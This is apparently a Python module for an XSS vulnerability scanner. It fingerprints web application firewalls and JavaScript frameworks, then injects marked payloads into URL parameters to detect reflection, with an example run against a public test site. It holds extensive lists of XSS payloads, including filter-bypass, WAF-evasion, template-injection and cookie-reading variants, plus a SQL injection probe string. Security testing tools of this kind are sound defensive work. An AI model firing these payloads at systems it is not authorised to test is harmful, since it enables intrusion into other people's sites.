"""Enhanced XSS (Cross-Site Scripting) Scanner Module with Advanced Detection Capabilities."""

import asyncio
import httpx
import re
import json
import base64
import hashlib
import time
from typing import Dict, List, Any, Optional, Set, Tuple
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode, quote, urljoin, urlunparse
from html import escape, unescape
from collections import defaultdict
from enum import Enum

# Base classes and enums
class ScanType(Enum):
    PASSIVE = "passive"
    ACTIVE = "active"
    AGGRESSIVE = "aggressive"

class SeverityLevel(Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"

class Vulnerability:
    def __init__(self, module, name, description, severity, confidence, 
                 affected_urls, evidence=None, remediation="", references=None, cwe_ids=None):
        self.module = module
        self.name = name
        self.description = description
        self.severity = severity
        self.confidence = confidence
        self.affected_urls = affected_urls
        self.evidence = evidence or {}
        self.remediation = remediation
        self.references = references or []
        self.cwe_ids = cwe_ids or []

class ScanConfig:
    def __init__(self, target, scan_type=ScanType.ACTIVE, debug=False):
        self.target = target
        self.scan_type = scan_type
        self.debug = debug

class ScanResult:
    def __init__(self, module_name, success, started_at, completed_at, 
                 vulnerabilities=None, errors=None, warnings=None, info=None, statistics=None):
        self.module_name = module_name
        self.success = success
        self.started_at = started_at
        self.completed_at = completed_at
        self.vulnerabilities = vulnerabilities or []
        self.errors = errors or []
        self.warnings = warnings or []
        self.info = info or {}
        self.statistics = statistics or {}

class BaseScannerModule:
    """Base class for scanner modules."""
    def __init__(self):
        self.name = "BaseScanner"
        self.description = "Base scanner module"
        self.scan_type = ScanType.ACTIVE
    
    async def scan(self, config: ScanConfig) -> ScanResult:
        """Override this method in subclasses."""
        raise NotImplementedError

# Selenium/Playwright imports (with fallback)
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

try:
    from playwright.async_api import async_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False


class XSSScanner(BaseScannerModule):
    """Enhanced Cross-Site Scripting (XSS) vulnerability scanner with advanced detection."""
    
    def __init__(self):
        super().__init__()
        self.name = "XSSScanner"
        self.description = "Detects Cross-Site Scripting (XSS) vulnerabilities with advanced DOM and stored XSS detection"
        self.scan_type = ScanType.ACTIVE
        self.debug_mode = False
        
        # Store submitted payloads for stored XSS verification
        self.stored_xss_markers = {}
        self.stored_xss_submissions = []
        
        # XSS payloads categorized by type
        self.xss_payloads = {
            'basic': [
                '<script>alert(1)</script>',
                '<script>alert("XSS")</script>',
                '<script>alert(String.fromCharCode(88,83,83))</script>',
                '<img src=x onerror=alert(1)>',
                '<img src="x" onerror="alert(1)">',
                '<svg onload=alert(1)>',
                '<body onload=alert(1)>',
                '<input onfocus=alert(1) autofocus>',
                '<iframe src="javascript:alert(1)">',
                '<details open ontoggle=alert(1)>',
                '<marquee onstart=alert(1)>',
            ],
            
            'encoded': [
                '&lt;script&gt;alert(1)&lt;/script&gt;',
                '&#60;script&#62;alert(1)&#60;/script&#62;',
                '%3Cscript%3Ealert(1)%3C/script%3E',
                '%3Cimg%20src=x%20onerror=alert(1)%3E',
                '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
                '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
                '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E',
            ],
            
            'event_handlers': [
                '" onmouseover="alert(1)',
                "' onmouseover='alert(1)",
                '" onfocus="alert(1)" autofocus="',
                "' onfocus='alert(1)' autofocus='",
                '" onclick="alert(1)',
                "' onclick='alert(1)",
                '"><script>alert(1)</script>',
                "'><script>alert(1)</script>",
                '"><img src=x onerror=alert(1)>',
                "'><img src=x onerror=alert(1)>",
            ],
            
            'javascript_protocol': [
                'javascript:alert(1)',
                'javascript:alert("XSS")',
                'javascript:void(alert(1))',
                'JaVaScRiPt:alert(1)',
                'javascript&#58;alert(1)',
                'javascript&#x3A;alert(1)',
            ],
            
            'dom_based': [
                '#<script>alert(1)</script>',
                '?name=<script>alert(1)</script>',
                '#"><img src=x onerror=alert(1)>',
                '?search="><script>alert(1)</script>',
                'javascript:alert(document.location)',
                'javascript:alert(document.cookie)',
            ],
            
            'filter_bypass': [
                '<ScRiPt>alert(1)</ScRiPt>',
                '<script >alert(1)</script>',
                '<script\t>alert(1)</script>',
                '<script\n>alert(1)</script>',
                '<script\r>alert(1)</script>',
                "<script/**/>alert(1)</script>",
                '<script/src=data:,alert(1)>',
                '<IMG SRC=x onerror="alert(1)">',
                '<iMg SrC=x OnErRoR=alert(1)>',
            ],
            
            'waf_evasion': [
                '<sCrIpT>alert(1)</sCrIpT>',
                '<img/src=x/onerror=alert(1)>',
                '<svg/onload=alert(1)>',
                '<iframe/src="javascript:alert(1)">',
                '<script>alert(1)%0d%0a</script>',
                '<img src=x onerror=alert`1`>',
                '<svg><animate onbegin=alert(1)>',
                '<img src=x onerror=alert&#40;1&#41;>',
                '<script>alert(String.fromCharCode(49))</script>',
                '<img src=x:x onerror=alert(1)>',
            ],
            
            'polyglot': [
                '">\'><img src=x onerror=alert(1)>',
                '"><script>alert(String.fromCharCode(88,83,83))</script>',
                '\'-alert(1)-\'',
                '";alert(1);//',
                '</script><script>alert(1)</script>',
            ],
            
            'stored_xss_test': [
                '<script>alert("STORED_XSS_TEST_{marker}")</script>',
                '<img src=x onerror="console.log(\'STORED_XSS_{marker}\')">',
                '<svg onload="alert(\'STORED_XSS_{marker}\')">',
                '"><script>alert("STORED_{marker}")</script>',
                '<script>document.write("XSS_{marker}")</script>',
            ],
            
            'framework_specific': {
                'react': [
                    'javascript:alert(1)',
                    '<img src=x onerror=alert(1)>',
                    '{alert(1)}',
                    '${alert(1)}',
                ],
                'angular': [
                    '{{constructor.constructor("alert(1)")()}}',
                    '{{$on.constructor("alert(1)")()}}',
                    '<img src=x ng-focus=$event.view.alert(1)>',
                ],
                'vue': [
                    '{{_c.constructor("alert(1)")()}}',
                    '<img src=x @error="alert(1)">',
                    'v-on:click="alert(1)"',
                ],
            },
            
            'dom_clobbering': [
                '<form name="document"><input name="cookie"></form>',
                '<img name="location" src="x">',
                '<a id="getElementById"></a>',
                '<form id="test"><input name="action"></form>',
            ]
        }
        
        # XSS indicators
        self.xss_indicators = [
            r'<script[^>]*>.*?alert\([^)]*\).*?</script>',
            r'onerror\s*=\s*["\']?alert\(',
            r'onload\s*=\s*["\']?alert\(',
            r'onclick\s*=\s*["\']?alert\(',
            r'javascript:\s*alert\(',
            r'<img[^>]*onerror[^>]*>',
            r'<svg[^>]*onload[^>]*>',
        ]
        
        # Context detection patterns
        self.context_patterns = {
            'html_tag': r'<[^>]*{payload}[^>]*>',
            'html_attribute': r'[a-zA-Z]+\s*=\s*["\']?{payload}',
            'javascript': r'<script[^>]*>[^<]*{payload}[^<]*</script>',
            'url': r'(href|src|action)\s*=\s*["\']?[^"\']*{payload}',
            'css': r'<style[^>]*>[^<]*{payload}[^<]*</style>',
            'json': r'\{[^}]*["\']:\s*["\'][^"\']*{payload}',
        }
        
        # WAF detection patterns
        self.waf_indicators = {
            'cloudflare': ['cloudflare', 'cf-ray', 'cf-request-id'],
            'akamai': ['akamai', 'akamai-origin-hop'],
            'imperva': ['incapsula', 'imperva', 'visid_incap'],
            'aws': ['awselb', 'x-amzn-requestid', 'x-amz-cf-id'],
            'sucuri': ['sucuri', 'x-sucuri-id'],
            'wordfence': ['wordfence'],
            'modsecurity': ['mod_security', 'naxsi'],
            'generic': ['blocked', 'forbidden', 'not acceptable', 'security policy']
        }
        
        # DOM sources and sinks
        self.dom_sources = [
            'location.hash', 'location.search', 'location.href',
            'document.URL', 'document.documentURI', 'document.referrer',
            'window.name', 'document.cookie'
        ]
        
        self.dom_sinks = [
            'eval', 'setTimeout', 'setInterval', 'Function',
            'document.write', 'document.writeln', 'innerHTML',
            'outerHTML', 'insertAdjacentHTML'
        ]
        
        # JavaScript framework detection patterns
        self.framework_patterns = {
            'react': [r'react', r'__REACT', r'_reactRoot'],
            'angular': [r'angular', r'ng-app', r'ng-controller'],
            'vue': [r'vue', r'v-if', r'v-for'],
            'jquery': [r'jquery', r'\$\(', r'jQuery'],
        }
    
    async def scan(self, config: ScanConfig) -> ScanResult:
        """Perform comprehensive XSS vulnerability scan."""
        self.debug_mode = config.debug
        
        if self.debug_mode:
            print(f"[DEBUG] XSSScanner starting for target: {config.target}")
        
        started_at = datetime.utcnow()
        vulnerabilities = []
        errors = []
        warnings = []
        info = {
            'tested_parameters': [],
            'vulnerable_parameters': [],
            'xss_types_found': [],
            'waf_detected': False,
            'frameworks_detected': []
        }
        statistics = {
            'urls_tested': 0,
            'parameters_tested': 0,
            'payloads_tested': 0,
            'vulnerabilities_found': 0
        }
        
        try:
            target_url = config.target
            if not target_url.startswith(('http://', 'https://')):
                target_url = f"https://{target_url}"
            
            # Detect WAF
            waf_info = await self._detect_waf_advanced(target_url)
            info['waf_detected'] = waf_info['detected']
            
            # Detect frameworks
            frameworks = await self._detect_frameworks(target_url)
            info['frameworks_detected'] = frameworks
            
            if config.scan_type == ScanType.PASSIVE:
                # Passive checks only
                passive_vulns = await self._passive_xss_check(target_url)
                vulnerabilities.extend(passive_vulns)
            else:
                # Active testing
                reflected_results = await self._test_reflected_xss_enhanced(
                    target_url, config, waf_info, frameworks
                )
                vulnerabilities.extend(reflected_results['vulnerabilities'])
                statistics['payloads_tested'] += reflected_results['payloads_tested']
            
            # Update statistics
            statistics['vulnerabilities_found'] = len(vulnerabilities)
            statistics['urls_tested'] = 1
            
        except Exception as e:
            errors.append(f"XSS scan failed: {str(e)}")
            if self.debug_mode:
                import traceback
                print(f"[DEBUG] Error: {traceback.format_exc()}")
        
        completed_at = datetime.utcnow()
        
        return ScanResult(
            module_name=self.name,
            success=len(errors) == 0,
            started_at=started_at,
            completed_at=completed_at,
            vulnerabilities=vulnerabilities,
            errors=errors,
            warnings=warnings,
            info=info,
            statistics=statistics
        )
    
    async def _detect_waf_advanced(self, url: str) -> Dict[str, Any]:
        """Advanced WAF detection."""
        waf_info = {'detected': False, 'type': 'Unknown', 'confidence': 0.0}
        
        try:
            async with httpx.AsyncClient(verify=False, timeout=10.0) as client:
                test_payloads = ['<script>alert(1)</script>', "' OR '1'='1"]
                
                for payload in test_payloads:
                    try:
                        response = await client.get(f"{url}?test={payload}")
                        headers_lower = {k.lower(): v.lower() for k, v in response.headers.items()}
                        
                        # Check headers for WAF signatures
                        for waf_name, indicators in self.waf_indicators.items():
                            if waf_name == 'generic':
                                continue
                            for indicator in indicators:
                                if any(indicator in v for v in headers_lower.values()):
                                    waf_info['detected'] = True
                                    waf_info['type'] = waf_name.capitalize()
                                    waf_info['confidence'] = 0.9
                                    return waf_info
                        
                        # Check response body
                        response_text = response.text.lower()
                        for indicator in self.waf_indicators['generic']:
                            if indicator in response_text:
                                waf_info['detected'] = True
                                waf_info['type'] = 'Generic WAF'
                                waf_info['confidence'] = 0.7
                        
                        # Check status codes
                        if response.status_code in [403, 406, 419, 429, 503]:
                            waf_info['detected'] = True
                            if waf_info['type'] == 'Unknown':
                                waf_info['type'] = 'Generic WAF'
                    except:
                        pass
        except:
            pass
        
        return waf_info
    
    async def _detect_frameworks(self, url: str) -> List[str]:
        """Detect JavaScript frameworks."""
        frameworks = []
        
        try:
            async with httpx.AsyncClient(verify=False, timeout=10.0) as client:
                response = await client.get(url)
                content = response.text.lower()
                
                for framework, patterns in self.framework_patterns.items():
                    for pattern in patterns:
                        if re.search(pattern, content, re.IGNORECASE):
                            if framework not in frameworks:
                                frameworks.append(framework)
                            break
        except:
            pass
        
        return frameworks
    
    async def _test_reflected_xss_enhanced(
        self, url: str, config: ScanConfig, waf_info: Dict, frameworks: List[str]
    ) -> Dict[str, Any]:
        """Enhanced reflected XSS testing."""
        vulnerabilities = []
        tested_params = []
        payloads_tested = 0
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            params = {'q': ['test'], 'search': ['test'], 'name': ['test']}
        
        # Select payloads based on WAF
        if waf_info['detected']:
            base_payloads = self.xss_payloads['waf_evasion'][:5]
        else:
            base_payloads = self.xss_payloads['basic'][:5]
        
        async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=15.0) as client:
            for param_name, param_values in params.items():
                tested_params.append(param_name)
                
                for payload in base_payloads:
                    payloads_tested += 1
                    
                    # Create unique marker
                    marker = hashlib.md5(f"{param_name}{payload}{time.time()}".encode()).hexdigest()[:12]
                    marked_payload = payload.replace('alert(1)', f'alert("{marker}")')
                    
                    test_params = params.copy()
                    test_params[param_name] = [marked_payload]
                    test_query = urlencode(test_params, doseq=True)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                    
                    if self.debug_mode:
                        print(f"[DEBUG] Testing param '{param_name}' with payload: {marked_payload[:50]}")
                    
                    try:
                        response = await client.get(test_url)
                        
                        # Check for reflection
                        if marked_payload in response.text or marker in response.text:
                            context = self._determine_context_enhanced(marked_payload, response.text)
                            
                            vuln = Vulnerability(
                                module=self.name,
                                name=f"Reflected XSS in parameter '{param_name}'",
                                description=f"Parameter '{param_name}' is vulnerable to reflected XSS in {context} context.",
                                severity=SeverityLevel.HIGH,
                                confidence=0.9,
                                affected_urls=[url],
                                evidence={
                                    'parameter': param_name,
                                    'payload': payload,
                                    'context': context,
                                    'marker': marker
                                },
                                remediation="Implement proper output encoding for user input.",
                                references=["https://owasp.org/www-community/attacks/xss/"],
                                cwe_ids=["CWE-79"]
                            )
                            
                            vulnerabilities.append(vuln)
                            break
                    except Exception as e:
                        if self.debug_mode:
                            print(f"[DEBUG] Error testing payload: {e}")
        
        return {
            'vulnerabilities': vulnerabilities,
            'tested_params': tested_params,
            'payloads_tested': payloads_tested
        }
    
    async def _passive_xss_check(self, url: str) -> List[Vulnerability]:
        """Passive XSS checks."""
        vulnerabilities = []
        
        try:
            async with httpx.AsyncClient(verify=False, timeout=10.0) as client:
                response = await client.get(url)
                content = response.text.lower()
                
                # Check for unsafe inline scripts
                if '<script>' in content and 'document.write' in content:
                    vulnerabilities.append(
                        Vulnerability(
                            module=self.name,
                            name="Potential DOM XSS - Unsafe document.write",
                            description="Page uses document.write which could lead to DOM-based XSS",
                            severity=SeverityLevel.MEDIUM,
                            confidence=0.6,
                            affected_urls=[url],
                            remediation="Avoid using document.write. Use safe DOM manipulation methods.",
                            cwe_ids=["CWE-79"]
                        )
                    )
                
                # Check for missing CSP header
                if 'content-security-policy' not in response.headers:
                    vulnerabilities.append(
                        Vulnerability(
                            module=self.name,
                            name="Missing Content Security Policy",
                            description="No CSP header found - increases XSS risk",
                            severity=SeverityLevel.LOW,
                            confidence=1.0,
                            affected_urls=[url],
                            remediation="Implement Content Security Policy to mitigate XSS attacks.",
                            references=["https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"]
                        )
                    )
        except:
            pass
        
        return vulnerabilities
    
    def _determine_context_enhanced(self, payload: str, response_text: str) -> str:
        """Determine the context where payload is reflected."""
        escaped_payload = re.escape(payload)
        
        # Check script context
        if re.search(f'<script[^>]*>.*{escaped_payload}.*</script>', response_text, re.DOTALL | re.IGNORECASE):
            return 'javascript'
        
        # Check event handler
        if re.search(f'on\\w+=["\']?[^"\']*{escaped_payload}', response_text, re.IGNORECASE):
            return 'event_handler'
        
        # Check HTML tag
        if re.search(f'<[^>]*{escaped_payload}[^>]*>', response_text):
            return 'html_tag'
        
        # Check HTML attribute
        if re.search(f'[a-zA-Z]+\\s*=\\s*["\']?[^"\']*{escaped_payload}', response_text):
            return 'html_attribute'
        
        # Check URL context
        if re.search(f'(?:href|src|action)\\s*=\\s*["\']?[^"\']*{escaped_payload}', response_text, re.IGNORECASE):
            return 'url'
        
        return 'html_content'


# Example usage
async def main():
    """Example usage of the XSS Scanner."""
    scanner = XSSScanner()
    config = ScanConfig(
        target="http://testphp.vulnweb.com",
        scan_type=ScanType.ACTIVE,
        debug=True
    )
    
    print("Starting XSS scan...")
    result = await scanner.scan(config)
    
    print(f"\nScan completed: {'Success' if result.success else 'Failed'}")
    print(f"Vulnerabilities found: {len(result.vulnerabilities)}")
    
    for vuln in result.vulnerabilities:
        print(f"\n[{vuln.severity.value.upper()}] {vuln.name}")
        print(f"  Description: {vuln.description}")
        print(f"  Confidence: {vuln.confidence:.2%}")
        print(f"  Affected URL: {vuln.affected_urls[0] if vuln.affected_urls else 'N/A'}")
        if vuln.evidence:
            print(f"  Evidence: {vuln.evidence}")

if __name__ == "__main__":
    asyncio.run(main())